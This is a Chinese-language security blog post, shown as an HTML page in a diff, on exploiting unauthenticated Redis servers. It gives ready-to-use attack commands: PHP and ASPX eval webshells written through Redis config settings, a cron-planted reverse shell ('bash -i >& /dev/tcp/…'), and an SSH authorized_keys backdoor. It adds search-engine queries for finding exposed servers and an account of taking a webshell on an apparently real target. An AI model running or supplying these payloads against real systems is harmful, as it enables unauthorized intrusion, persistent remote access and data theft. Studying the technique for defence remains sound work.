@@ -1,0 +1,1107 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="generator" content="Hexo 3.9.0">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/128x128.ico?v=7.3.0">
+  <meta name="google-site-verification" content="GGFme5OaJm26Z2TDjB--Ol2pfQANqnR69mkuVsw70rU">
+
+<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+  <link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css">
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    search: {
+      root: '/',
+      path: 'search.xml'
+    },
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'copy',
+      copy_success: 'succeed',
+      copy_failure: 'failed'
+    }
+  };
+</script>
+
+  <meta name="description" content="Redis漏洞利用与防御前言 Redis在大公司被大量应用，通过笔者的研究发现，目前在互联网上已经出现Redis未经授权病毒似自动攻击，攻击成功后会对内网进行扫描、控制、感染以及用来进行挖矿、勒索等恶意行为，早期网上曾经分析过一篇文章“通过redis感染linux版本勒索病毒的服务器”（http://www.sohu.com/a/143409075_765820），如果公司使用了Redis，那么应">
+<meta name="keywords" content="redis">
+<meta property="og:type" content="article">
+<meta property="og:title" content="redis未授权访问">
+<meta property="og:url" content="https://wh0ale.github.io/2018/12/13/2018-12-13-redis未授权访问/index.html">
+<meta property="og:site_name" content="Wh0ale&#39;s Blog">
+<meta property="og:description" content="Redis漏洞利用与防御前言 Redis在大公司被大量应用，通过笔者的研究发现，目前在互联网上已经出现Redis未经授权病毒似自动攻击，攻击成功后会对内网进行扫描、控制、感染以及用来进行挖矿、勒索等恶意行为，早期网上曾经分析过一篇文章“通过redis感染linux版本勒索病毒的服务器”（http://www.sohu.com/a/143409075_765820），如果公司使用了Redis，那么应">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://image.3001.net/images/20180504/15254230044192.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180504/15254230535225.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180504/15254230642483.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180504/15254230762058.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180504/15254230864637.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180504/15254230954638.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180504/15254231059009.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180504/15254231135066.png!small">
+<meta property="og:updated_time" content="2019-12-03T06:10:16.467Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="redis未授权访问">
+<meta name="twitter:description" content="Redis漏洞利用与防御前言 Redis在大公司被大量应用，通过笔者的研究发现，目前在互联网上已经出现Redis未经授权病毒似自动攻击，攻击成功后会对内网进行扫描、控制、感染以及用来进行挖矿、勒索等恶意行为，早期网上曾经分析过一篇文章“通过redis感染linux版本勒索病毒的服务器”（http://www.sohu.com/a/143409075_765820），如果公司使用了Redis，那么应">
+<meta name="twitter:image" content="https://image.3001.net/images/20180504/15254230044192.png!small">
+  <link rel="alternate" href="/atom.xml" title="Wh0ale's Blog" type="application/atom+xml">
+  <link rel="canonical" href="https://wh0ale.github.io/2018/12/13/2018-12-13-redis未授权访问/">
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>redis未授权访问 | Wh0ale's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Wh0ale's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+    <ul id="menu" class="menu">
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-sitemap">
+      
+    
+
+    <a href="/sitemap.xml" rel="section"><i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-search">
+          <a href="javascript:;" class="popup-trigger">
+          
+            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+    </div>
+</nav>
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+    <div class="reading-progress-bar"></div>
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wh0ale.github.io/2018/12/13/2018-12-13-redis未授权访问/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Wh0ale">
+      <meta itemprop="description" content="No master and rookie，only hardworking and lazy.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Wh0ale's Blog">
+    </span>
+      <header class="post-header">
+
+        
+          <h1 class="post-title" itemprop="name headline">redis未授权访问
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2018-12-13 00:00:00" itemprop="dateCreated datePublished" datetime="2018-12-13T00:00:00+08:00">2018-12-13</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-12-03 14:10:16" itemprop="dateModified" datetime="2019-12-03T14:10:16+08:00">2019-12-03</time>
+              </span>
+            
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon"
+              >
+                <i class="fa fa-eye"></i>
+                 阅读次数： 
+                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+              </span>
+            </span>
+          <br>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span title="本文字数">7k</span>
+            </span>
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span title="阅读时长">6 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+
+
+      
+        <h1 id="Redis漏洞利用与防御"><a href="#Redis漏洞利用与防御" class="headerlink" title="Redis漏洞利用与防御"></a>Redis漏洞利用与防御</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p> Redis在大公司被大量应用，通过笔者的研究发现，目前在互联网上已经出现Redis未经授权病毒似自动攻击，攻击成功后会对内网进行扫描、控制、感染以及用来进行挖矿、勒索等恶意行为，早期网上曾经分析过一篇文章“通过redis感染linux版本勒索病毒的服务器”（<a href="http://www.sohu.com/a/143409075_765820" target="_blank" rel="noopener">http://www.sohu.com/a/143409075_765820</a>），如果公司使用了Redis，那么应当给予重视，通过实际研究，当在一定条件下，攻击者可以获取webshell，甚至root权限。</p>
+<h2 id="Redis简介及搭建实验环境"><a href="#Redis简介及搭建实验环境" class="headerlink" title="Redis简介及搭建实验环境"></a>Redis简介及搭建实验环境</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Remote Dictionary Server(Redis) 是一个由Salvatore Sanfilippo写的key-value存储系统。Redis是一个开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。它通常被称为数据结构服务器，因为值（value）可以是字符串(String), 哈希(Map), 列表(list), 集合(sets) 和有序集合(sorted sets)等类型。从2010年3月15日起，Redis的开发工作由VMware主持。从2013年5月开始，Redis的开发由Pivotal赞助。目前最新稳定版本为4.0.8。</p>
+<h3 id="Redis默认端口"><a href="#Redis默认端口" class="headerlink" title="Redis默认端口"></a>Redis默认端口</h3><p>Redis默认配置端口为6379，sentinel.conf配置器端口为26379</p>
+<h3 id="官方站点"><a href="#官方站点" class="headerlink" title="官方站点"></a>官方站点</h3><p><a href="https://redis.io/" target="_blank" rel="noopener">https://redis.io/</a></p>
+<p><a href="http://download.redis.io/releases/redis-3.2.11.tar.gz" target="_blank" rel="noopener">http://download.redis.io/releases/redis-3.2.11.tar.gz</a></p>
+<h3 id="安装-redis"><a href="#安装-redis" class="headerlink" title="安装 redis"></a>安装 redis</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget http://download.redis.io/releases/redis-4.0.8.tar.gz</span><br><span class="line">tar –xvf redis-4.0.8.tar.gz</span><br><span class="line">cd redis-4.0.8</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
+
+<p>最新版本前期漏洞已经修复，测试时建议安装3.2.11版本。</p>
+<h3 id="修改配置文件-redis-conf"><a href="#修改配置文件-redis-conf" class="headerlink" title="修改配置文件 redis.conf"></a>修改配置文件 redis.conf</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cp redis.conf ./src/redis.conf</span><br><span class="line">bind 127.0.0.1  前面加上#号注释掉</span><br><span class="line">protected-mode 设为 no</span><br><span class="line"></span><br><span class="line">启动 redis-server</span><br><span class="line">./src/redis-server redis.conf</span><br></pre></td></tr></table></figure>
+
+<p> 最新版安装成功后，如图1所示。默认的配置是使用6379端口，没有密码。这时候会导致未授权访问然后使用redis权限写文件。</p>
+<p><a href="https://image.3001.net/images/20180504/15254230044192.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180504/15254230044192.png!small" alt="image.png"></a></p>
+<center>图1 安装配置 redis</center>
+
+
+<h3 id="连接Redis服务器"><a href="#连接Redis服务器" class="headerlink" title="连接Redis服务器"></a>连接Redis服务器</h3><h4 id="交互式方式"><a href="#交互式方式" class="headerlink" title="交互式方式"></a>交互式方式</h4><p><code>redis-cli -h {host} -p {port}</code> 方式连接，然后所有的操作都是在交互的方式实现，不需要再执行redis-cli了，例如命令:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 127.0.0.1-p 6379</span><br><span class="line"></span><br><span class="line">加-a参数表示带密码的访问</span><br></pre></td></tr></table></figure>
+
+<h4 id="命令方式"><a href="#命令方式" class="headerlink" title="命令方式"></a>命令方式</h4><p><code>redis-cli -h {host} -p {port} {command}</code> 直接得到命令的返回结果.</p>
+<h3 id="常见命令"><a href="#常见命令" class="headerlink" title="常见命令"></a>常见命令</h3><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>info</td>
+<td>查看信息</td>
+</tr>
+<tr>
+<td>flushall</td>
+<td>删除所有数据库内容</td>
+</tr>
+<tr>
+<td>flushdb</td>
+<td>刷新数据库</td>
+</tr>
+<tr>
+<td>KEYS *</td>
+<td>查看所有键,使用 select num 可以查看键值数据</td>
+</tr>
+<tr>
+<td>set test “who am i”</td>
+<td>设置变量</td>
+</tr>
+<tr>
+<td>config set dir dirpath</td>
+<td>设置路径等配置</td>
+</tr>
+<tr>
+<td>save</td>
+<td>保存</td>
+</tr>
+<tr>
+<td>get 变量</td>
+<td>查看变量名称</td>
+</tr>
+</tbody></table>
+<p>更多命令可以参考文章：<a href="https://www.cnblogs.com/kongzhongqijing/p/6867960.html" target="_blank" rel="noopener">https://www.cnblogs.com/kongzhongqijing/p/6867960.html</a></p>
+<h3 id="相关漏洞"><a href="#相关漏洞" class="headerlink" title="相关漏洞"></a>相关漏洞</h3><p> 因配置不当可以未经授权访问，攻击者无需认证就可以访问到内部数据，其漏洞可导致敏感信息泄露（Redis服务器存储一些有趣的session、cookie或商业数据可以通过get枚举键值），也可以恶意执行flushall来清空所有数据，攻击者还可通过EVAL执行lua代码，或通过数据备份功能往磁盘写入后门文件。如果Redis以root身份运行，可以给root账户写入SSH公钥文件，直接免密码登录服务器，其相关漏洞信息如下：</p>
+<h4 id="Redis-远程代码执行漏洞-CVE-2016-8339"><a href="#Redis-远程代码执行漏洞-CVE-2016-8339" class="headerlink" title="Redis 远程代码执行漏洞(CVE-2016-8339)"></a><strong>Redis 远程代码执行漏洞(CVE-2016-8339)</strong></h4><p> Redis 3.2.x &lt; 3.2.4版本存在缓冲区溢出漏洞，可导致任意代码执行。Redis数据结构存储的CONFIG SET命令中client-output-buffer-limit选项处理存在越界写漏洞。构造的CONFIG SET命令可导致越界写，代码执行。</p>
+<h4 id="CVE-2015-8080"><a href="#CVE-2015-8080" class="headerlink" title="CVE-2015-8080"></a><strong>CVE-2015-8080</strong></h4><p> Redis 2.8.x在2.8.24以前和3.0.x 在3.0.6以前版本，lua_struct.c中存在getnum函数整数溢出，允许上下文相关的攻击者许可运行Lua代码（内存损坏和应用程序崩溃）或可能绕过沙盒限制意图通过大量，触发基于栈的缓冲区溢出。</p>
+<h4 id="CVE-2015-4335"><a href="#CVE-2015-4335" class="headerlink" title="CVE-2015-4335"></a><strong>CVE-2015-4335</strong></h4><p><strong>Redis 2.8.1之前版本和3.0.2之前3.x版本中存在安全漏洞。远程攻击者可执行eval命令利用该漏洞执行任意Lua字节码</strong></p>
+<h4 id="CVE-2013-7458"><a href="#CVE-2013-7458" class="headerlink" title="CVE-2013-7458"></a><strong>CVE-2013-7458</strong></h4><p> 读取“.rediscli_history”配置文件信息</p>
+<h2 id="Redis攻击思路"><a href="#Redis攻击思路" class="headerlink" title="Redis攻击思路"></a>Redis攻击思路</h2><h3 id="内网端口扫描"><a href="#内网端口扫描" class="headerlink" title="内网端口扫描"></a>内网端口扫描</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -v -n -Pn -p 6379 -sV --scriptredis-info 192.168.56.1/24</span><br></pre></td></tr></table></figure>
+
+<h3 id="通过文件包含读取其配置文件"><a href="#通过文件包含读取其配置文件" class="headerlink" title="通过文件包含读取其配置文件"></a>通过文件包含读取其配置文件</h3><p> Redis配置文件中一般会设置明文密码，在进行渗透时也可以通过webshell查看其配置文件，Redis往往不只一台计算机，可以利用其来进行内网渗透，或者扩展权限渗透。</p>
+<h3 id="使用Redis暴力破解工具"><a href="#使用Redis暴力破解工具" class="headerlink" title="使用Redis暴力破解工具"></a>使用Redis暴力破解工具</h3><p><a href="https://github.com/evilpacket/redis-sha-crack" target="_blank" rel="noopener">https://github.com/evilpacket/redis-sha-crack</a>，其命令为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node ./redis-sha-crack.js -w wordlist.txt -s shalist.txt 127.0.0.1 host2.example.com:5555</span><br></pre></td></tr></table></figure>
+
+<p>需要安装node：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/nodejs/node.git</span><br><span class="line">chmod -R 755 node</span><br><span class="line">cd node</span><br><span class="line">./configure</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
+
+<h3 id="msf下利用模块"><a href="#msf下利用模块" class="headerlink" title="msf下利用模块"></a>msf下利用模块</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/redis/file_upload    normal     Redis File Upload</span><br><span class="line">auxiliary/scanner/redis/redis_login    normal     Redis Login Utility</span><br><span class="line">auxiliary/scanner/redis/redis_server   normal     Redis Command Execute Scanner</span><br></pre></td></tr></table></figure>
+
+<h2 id="Redis漏洞利用"><a href="#Redis漏洞利用" class="headerlink" title="Redis漏洞利用"></a>Redis漏洞利用</h2><h3 id="获取webshell"><a href="#获取webshell" class="headerlink" title="获取webshell"></a>获取webshell</h3><p> 当redis权限不高时，并且服务器开着web服务，在redis有web目录写权限时，可以尝试往web路径写webshell，前提是知道物理路径，精简命令如下：**</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir E:/www/font</span><br><span class="line">config set dbfilename redis2.aspx</span><br><span class="line">set a &quot;&lt;%@ Page Language=\&quot;Jscript\&quot;%&gt;&lt;%eval(Request.Item[\&quot;c\&quot;],\&quot;unsafe\&quot;);%&gt;&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>（1）连接Redis服务器</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli –h 192.168.106.135 –p 6379</span><br></pre></td></tr></table></figure>
+
+<p>（2）在192.168.106.133上执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc –vlp 7999</span><br></pre></td></tr></table></figure>
+
+<p>（3）执行以下命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">set x &quot;\n\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.106.133/7999 0&gt;&amp;1\n\n&quot;</span><br><span class="line">config set dir /var/spool/cron/</span><br><span class="line">ubantu文件为：/var/spool/cron/crontabs/</span><br><span class="line">config set dir /var/spool/cron/crontabs/</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<h3 id="免密码登录ssh"><a href="#免密码登录ssh" class="headerlink" title="免密码登录ssh"></a>免密码登录ssh</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br><span class="line">config set dir /root/.ssh/</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">set x &quot;\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDZA3SEwRcvoYWXRkXoxu7BlmhVQz7Dd8H9ZFV0Y0wKOok1moUzW3+rrWHRaSUqLD5+auAmVlG5n1dAyP7ZepMkZHKWU94TubLBDKF7AIS3ZdHHOkYI8y0NRp6jvtOroZ9UO5va6Px4wHTNK+rmoXWxsz1dNDjO8eFy88Qqe9j3meYU/CQHGRSw0/XlzUxA95/ICmDBgQ7E9J/tN8BWWjs5+sS3wkPFXw1liRqpOyChEoYXREfPwxWTxWm68iwkE3/22LbqtpT1RKvVsuaLOrDz1E8qH+TBdjwiPcuzfyLnlWi6fQJci7FAdF2j4r8Mh9ONT5In3nSsAQoacbUS1lul root@kali2018\n\n\n&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<p>执行效果如图2所示:</p>
+<p><a href="https://image.3001.net/images/20180504/15254230535225.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180504/15254230535225.png!small" alt="image.png"></a></p>
+<center>图2Redis漏洞SSH免密码登录</center>
+
+
+<h3 id="使用漏洞搜索引擎搜索"><a href="#使用漏洞搜索引擎搜索" class="headerlink" title="使用漏洞搜索引擎搜索"></a>使用漏洞搜索引擎搜索</h3><p>（1）对“port: 6379”进行搜索</p>
+<p><a href="https://www.zoomeye.org/searchResult?q=port:6379" target="_blank" rel="noopener">https://www.zoomeye.org/searchResult?q=port:6379</a></p>
+<p>（2）除去显示“-NOAUTH Authentication required.”的结果，显示这个信息表示需要进行认证，也即需要密码才能访问。</p>
+<p>（3）<a href="https://fofa.so/" target="_blank" rel="noopener">https://fofa.so/</a></p>
+<p>关键字检索：port=”6379″ &amp;&amp; protocol==redis &amp;&amp; country=CN</p>
+<h3 id="Redis账号获取webshell实战"><a href="#Redis账号获取webshell实战" class="headerlink" title="Redis账号获取webshell实战"></a>Redis账号获取webshell实战</h3><p><strong>1.扫描某目标服务器端口信息</strong></p>
+<p> 通过nmap对某目标服务器进行全端口扫描，发现该目标开放Redis的端口为3357，默认端口为6379端口，再次通过iis put scaner软件进行同网段服务器该端口扫描，如图3所示，获取两台开放该端口的服务器。</p>
+<p><a href="https://image.3001.net/images/20180504/15254230642483.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180504/15254230642483.png!small" alt="image.png"></a></p>
+<center>图3扫描同网段开放该端口的服务器</center>
+
+
+<p><strong>2.使用telnet登录服务器</strong></p>
+<p>使用命令“telnet ip port”命令登录，例如 <code>telnet 1**.**.**.76 3357</code>，登录后，输入auth和密码进行认证。</p>
+<p><strong>3.查看并保存当前的配置信息。</strong></p>
+<p>通过“config get命令”查看dir和dbfilename的信息，并复制下来留待后续恢复使用。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">config get dir</span><br><span class="line">config get dbfilename</span><br></pre></td></tr></table></figure>
+
+<p><strong>4.配置并写入webshell</strong></p>
+<p>（1）设置路径</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config set dir E:/www/font</span><br></pre></td></tr></table></figure>
+
+<p>（2）设置数据库名称</p>
+<p>将dbfilename对名称设置为支持脚本类型的文件，例如网站支持php，则设置file.php即可，本例中为aspx，所以设置redis.aspx。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config set dbfilename redis.aspx</span><br></pre></td></tr></table></figure>
+
+<p>（3）设置webshell的内容</p>
+<p>根据实际情况来设置webshell的内容，webshell仅仅为一个变量，可以是a等其他任意字符，下面为一些参考示例。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">set webshell &quot;&lt;?php phpinfo(); ?&gt;&quot;</span><br><span class="line"> //php查看信息</span><br><span class="line">set webshell &quot;&lt;?php @eval($_POST[&apos;chopper&apos;]);?&gt; &quot;</span><br><span class="line"> //phpwebshell</span><br><span class="line">set webshell &quot;&lt;%@ Page Language=\&quot;Jscript\&quot;%&gt;&lt;%eval(Request.Item[\&quot;c\&quot;],\&quot;unsafe\&quot;);%&gt;&quot;</span><br><span class="line">// aspx的webshell，注意双引号使用\&quot;</span><br></pre></td></tr></table></figure>
+
+<p>（4）保存写入的内容</p>
+<p> <code>save</code></p>
+<p>（5）查看webshell的内容</p>
+<p> <code>get webshell</code></p>
+<p><strong>完整过程执行命令如图4所示，每一次命令显示“+OK”表示配置成功。</strong></p>
+<p><a href="https://image.3001.net/images/20180504/15254230762058.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180504/15254230762058.png!small" alt="image.png"></a></p>
+<center>图4写入webshell</center>
+
+
+<ol>
+<li><p>测试webshell是否正常</p>
+<p>在浏览器中输入对应写入文件的名字，如图5所示进行访问，出现类似：</p>
+</li>
+</ol>
+<p>“REDIS0006?webshell’a@H搀???”则表明正确获取webshell。</p>
+<p><a href="https://image.3001.net/images/20180504/15254230864637.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180504/15254230864637.png!small" alt="image.png"></a></p>
+<center>图5测试webshell是否正常</center>
+
+
+<p>6.获取webshell</p>
+<p>如图6所示，使用中国菜刀后门管理连接工具，成功获取该网站的webshell。</p>
+<p><a href="https://image.3001.net/images/20180504/15254230954638.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180504/15254230954638.png!small" alt="image.png"></a></p>
+<center>图6获取webshell</center>
+
+
+<p>7.恢复原始设置</p>
+<p>（1）恢复dir</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config set dir dirname</span><br></pre></td></tr></table></figure>
+
+<p>（2）恢复dbfilename</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config set dbfilename dbfilename</span><br></pre></td></tr></table></figure>
+
+<p>（3）删除webshell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">del webshell</span><br></pre></td></tr></table></figure>
+
+<p>（4）刷新数据库</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flushdb</span><br></pre></td></tr></table></figure>
+
+<p>8.完整命令总结</p>
